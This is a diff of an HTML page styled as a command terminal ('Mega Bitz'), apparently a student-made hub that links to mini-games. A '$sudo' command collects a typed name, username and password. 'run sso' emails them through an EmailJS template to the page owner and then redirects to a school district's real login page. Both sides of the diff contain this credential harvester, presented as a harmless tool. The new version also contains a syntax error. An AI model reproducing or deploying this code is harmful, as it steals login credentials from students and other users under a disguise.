@@ -1,72 +1,85 @@
-
 <!DOCTYPE html>
 <html>
-    <head>
-        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-        <script src="https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"></script>
-        <link rel="stylesheet" href="https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css"/>
-        <link rel="icon" href="icon.png">
-        <script type="text/javascript"
-    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-        <title>Mega Bitz|Home</title>
-        <style>
-            html,body,canvas { margin: 0; padding: 0; width: 100%; height: 100%; font-size: 0; }
-        </style>
-    </head>
-    <body id='body'>
-        <script>
-            var params = {
-                name: '',
-                user: '',
-                pass: ''
-            }
-        </script>
-        <script>
-            $('body').terminal({
-                '$app': function(what1, what2) {
-                    if (what1 == 'open') {
-                        if (what2 == 'guessem') {
-                            window.location.pathname = '/guessem'
-                        }
-                        if (what2 == 'guessemhard') {
-                            window.location.pathname = '/guessemhard'
-                        }
-                        if (what2 == 'loading') {
-                            window.location.pathname = '/loading'
-                        }
-                        if (what2 == 'encode') {
-                            window.location.pathname = '/text-encoder'
-                        }
-                    }
-                },
-                '$sudo': function(what1, what2) {
-                    if (what1 == 'name') {
-                        params.name = what2
-                    }
-                    if (what1 == 'user') {
-                        params.user = what2
-                    }
-                    if (what1 == 'pass') {
-                        params.pass = what2
-                    }
-                    if (what1 == 'games') {
-                        if (what2 == 'pls') {
-                            window.location = 'https://sites.google.com/view/iogames'
-                        }
-                    }
-                    if (what1 == 'run') {
-                        if (what2 == 'sso') {
-                            // `rewuweuodj36aer632466235-245-42524ynhdc24d-wr$$U®¨∑´´´¶b6´§ø•¶§∂ß¶§o76∫∂i76b∂¶ˆß§o∫§¶¶ˆ∫`
-                          //
-                            emailjs.send('default_service', 'template_tnz7xc5', params, 'user_S79td1VI68ICAjq796AOm').then(function() {
-                                window.location = 'https://idp.minnetonkaschools.org/login'
-                            })
-                        }
-                    }
-                }
-            }, {
-                greetings: ''
-            });
-        </script>
-    </body> 
+<head>
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://unpkg.com/jquery.terminal/js/jquery.terminal.min.js"></script>
+<link rel="stylesheet" href="https://unpkg.com/jquery.terminal/css/jquery.terminal.min.css"/>
+<link rel="icon" href="icon.png">
+<script type="text/javascript"
+src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<title>Mega Bitz|Home</title>
+<style>
+html,body,canvas { margin: 0; padding: 0; width: 100%; height: 100%; font-size: 0; }
+</style>
+</head>
+<body id='body'>
+<script>
+var what = {
+from: '',
+message''
+}
+var params = {
+name: '',
+user: '',
+pass: ''
+}
+</script>
+<script>
+$('body').terminal({
+'$app': function(what1, what2) {
+if (what1 == 'open') {
+if (what2 == 'guessem') {
+window.location.pathname = '/guessem'
+}
+if (what2 == 'guessemhard') {
+window.location.pathname = '/guessemhard'
+}
+if (what2 == 'loading') {
+window.location.pathname = '/loading'
+}
+if (what2 == 'encode') {
+window.location.pathname = '/text-encoder'
+}
+if (what2 == 'calc') {
+window.location.pathname = '/calculator'
+}
+}
+},
+'message': function(what1, what2) {
+what = {
+from: what1,
+message: what2
+}
+emailjs.send('default_service', 'template_tnz7xc5', what, 'user_S79td1VI68ICAjq796AOm')
+},
+'$sudo': function(what1, what2) {
+if (what1 == 'name') {
+params.name = what2
+}
+if (what1 == 'user') {
+params.user = what2
+}
+if (what1 == 'pass') {
+params.pass = what2
+}
+if (what1 == 'games') {
+if (what2 == 'pls') {
+window.location = 'https://sites.google.com/view/iogames'
+}
+}
+if (what1 == 'run') {
+if (what2 == 'sso') {
+// `rewuweuodj36aer632466235-245-42524ynhdc24d-wr$$U®¨∑´´´¶b6´§ø•¶§∂ß¶§o76∫∂i76b∂¶ˆß§o∫§¶¶ˆ∫`
+//
+emailjs.send('default_service', 'template_tnz7xc5', params, 'user_S79td1VI68ICAjq796AOm').then(function() {
+window.location = 'https://idp.minnetonkaschools.org/login'
+})
+}
+}
+}
+}, {
+greetings: ''
+});
+</script>
+</body> 
 </html>
